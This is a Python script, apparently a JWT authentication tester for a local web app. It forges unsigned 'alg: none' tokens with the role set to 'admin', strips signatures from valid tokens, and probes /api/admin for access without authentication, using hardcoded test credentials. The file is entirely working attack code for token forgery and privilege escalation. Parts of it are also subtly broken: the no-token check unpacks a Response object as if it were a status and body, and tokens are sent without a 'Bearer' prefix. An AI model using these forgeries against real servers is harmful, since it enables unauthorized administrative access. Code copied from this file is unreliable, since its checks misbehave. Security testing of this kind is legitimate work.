import requests
import jwt
import base64
import json
from copy import deepcopy

class JWTAuthTester:
    def __init__(self, base_url):
        self.base_url = base_url
        self.session = requests.Session()

    def login_and_get_token(self, endpoint, credentials):
        url = self.base_url + endpoint
        res = self.session.post(url, json=credentials)

        try:
            data = res.json()
            return data.get("token")
        except:
            return None

    def decode_token(self, token):
        try:
            return jwt.decode(token, options={"verify_signature": False})
        except:
            return None

    def encode_none_alg(self, payload):
        header = {"alg": "none", "typ": "JWT"}

        def b64(data):
            return base64.urlsafe_b64encode(json.dumps(data).encode()).rstrip(b"=").decode()

        return f"{b64(header)}.{b64(payload)}."

    def tamper_role(self, payload):
        tampered = deepcopy(payload)
        tampered["role"] = "admin"
        return tampered

    def remove_signature(self, token):
        parts = token.split(".")
        if len(parts) == 3:
            return parts[0] + "." + parts[1] + "."
        return token

    def test_endpoint(self, endpoint, token):
        url = self.base_url + endpoint

        headers = {"Authorization": token}
        res = self.session.get(url, headers=headers)

        return res.status_code, res.text

    def run_tests(self, login_ep, creds, target_ep):
        results = []

        token = self.login_and_get_token(login_ep, creds)
        if not token:
            results.append(("Login Failed", False))
            return results

        original_payload = self.decode_token(token)
        if not original_payload:
            results.append(("Decode Failed", False))
            return results

        # Baseline
        base_status, base_resp = self.test_endpoint(target_ep, token)

        # 1. Role Tampering
        tampered_payload = self.tamper_role(original_payload)
        none_token = self.encode_none_alg(tampered_payload)
        status, resp = self.test_endpoint(target_ep, none_token)

        if status == 200 and resp != base_resp:
            results.append(("JWT Role Tampering", True))
        else:
            results.append(("JWT Role Tampering", False))

        # 2. No Signature
        no_sig_token = self.remove_signature(token)
        status, resp = self.test_endpoint(target_ep, no_sig_token)

        if status == 200:
            results.append(("JWT No Signature Accepted", True))
        else:
            results.append(("JWT No Signature Accepted", False))

        # 3. No Token
        status, resp = self.session.get(self.base_url + target_ep)
        if status == 200:
            results.append(("No Auth Required", True))
        else:
            results.append(("No Auth Required", False))

        return results


if __name__ == "__main__":
    tester = JWTAuthTester("http://localhost:3000")

    creds = {
        "username": "user",
        "password": "user123"
    }

    results = tester.run_tests(
        login_ep="/api/login",
        creds=creds,
        target_ep="/api/admin"
    )

    for test, result in results:
        print(f"{test}: {'VULNERABLE' if result else 'SAFE'}")